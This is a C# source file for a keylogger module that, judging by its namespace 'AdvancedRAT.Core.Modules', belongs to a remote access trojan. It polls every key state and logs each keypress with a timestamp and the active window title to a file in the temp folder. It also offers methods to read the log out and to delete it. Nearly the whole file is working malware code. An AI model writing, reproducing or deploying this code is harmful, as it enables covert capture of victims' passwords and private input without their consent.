using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AdvancedRAT.Core.Modules
{
    public class Keylogger
    {
        private static bool loggingActive = false;
        private static string logFilePath = Path.Combine(Path.GetTempPath(), "keylog.txt");
        private static object lockObject = new object();
        
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);
        
        public static void StartLogging()
        {
            if (loggingActive)
                return;
                
            loggingActive = true;
            Task.Run(LogKeys);
        }
        
        public static void StopLogging()
        {
            loggingActive = false;
        }
        
        private static async Task LogKeys()
        {
            List<string> specialKeys = new List<string>();
            
            while (loggingActive)
            {
                Thread.Sleep(10); // Small delay to prevent high CPU usage
                
                // Capture active window title
                string activeWindowTitle = GetActiveWindowTitle();
                
                // Check all possible keys
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    
                    if (keyState == 1 || keyState == -127) // Key was just pressed
                    {
                        string key = GetKeyName(i);
                        
                        if (!string.IsNullOrEmpty(key))
                        {
                            string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [{activeWindowTitle}] {key}";
                            
                            lock (lockObject)
                            {
                                File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
                            }
                        }
                    }
                }
                
                await Task.Delay(1);
            }
        }
        
        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            
            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            
            return "Unknown Window";
        }
        
        private static string GetKeyName(int key)
        {
            switch (key)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]";
                case 20: return "[CAPSLOCK]";
                case 27: return "[ESCAPE]";
                case 32: return " ";
                case 33: return "[PAGE UP]";
                case 34: return "[PAGE DOWN]";
                case 35: return "[END]";
                case 36: return "[HOME]";
                case 37: return "[LEFT]";
                case 38: return "[UP]";
                case 39: return "[RIGHT]";
                case 40: return "[DOWN]";
                case 44: return "[PRINT SCREEN]";
                case 46: return "[DELETE]";
                case 48: return "0";
                case 49: return "1";
                case 50: return "2";
                case 51: return "3";
                case 52: return "4";
                case 53: return "5";
                case 54: return "6";
                case 55: return "7";
                case 56: return "8";
                case 57: return "9";
                case 65: return "a";
                case 66: return "b";
                case 67: return "c";
                case 68: return "d";
                case 69: return "e";
                case 70: return "f";
                case 71: return "g";
                case 72: return "h";
                case 73: return "i";
                case 74: return "j";
                case 75: return "k";
                case 76: return "l";
                case 77: return "m";
                case 78: return "n";
                case 79: return "o";
                case 80: return "p";
                case 81: return "q";
                case 82: return "r";
                case 83: return "s";
                case 84: return "t";
                case 85: return "u";
                case 86: return "v";
                case 87: return "w";
                case 88: return "x";
                case 89: return "y";
                case 90: return "z";
                case 96: return "0"; // Num pad
                case 97: return "1"; // Num pad
                case 98: return "2"; // Num pad
                case 99: return "3"; // Num pad
                case 100: return "4"; // Num pad
                case 101: return "5"; // Num pad
                case 102: return "6"; // Num pad
                case 103: return "7"; // Num pad
                case 104: return "8"; // Num pad
                case 105: return "9"; // Num pad
                case 106: return "*"; // Num pad
                case 107: return "+"; // Num pad
                case 109: return "-"; // Num pad
                case 110: return "."; // Num pad
                case 111: return "/"; // Num pad
                case 112: return "[F1]";
                case 113: return "[F2]";
                case 114: return "[F3]";
                case 115: return "[F4]";
                case 116: return "[F5]";
                case 117: return "[F6]";
                case 118: return "[F7]";
                case 119: return "[F8]";
                case 120: return "[F9]";
                case 121: return "[F10]";
                case 122: return "[F11]";
                case 123: return "[F12]";
                case 144: return "[NUM LOCK]";
                case 160: return "[LSHIFT]";
                case 161: return "[RSHIFT]";
                case 162: return "[LCONTROL]";
                case 163: return "[RCONTROL]";
                case 164: return "[LMENU]";
                case 165: return "[RMENU]";
                case 186: return ";";
                case 187: return "=";
                case 188: return ",";
                case 189: return "-";
                case 190: return ".";
                case 191: return "/";
                case 192: return "`";
                case 219: return "[";
                case 220: return "\\";
                case 221: return "]";
                case 222: return "'";
                default: return null;
            }
        }
        
        public static string GetLogContent()
        {
            if (File.Exists(logFilePath))
            {
                return File.ReadAllText(logFilePath);
            }
            return "";
        }
        
        public static void ClearLogs()
        {
            if (File.Exists(logFilePath))
            {
                File.Delete(logFilePath);
            }
        }
    }
}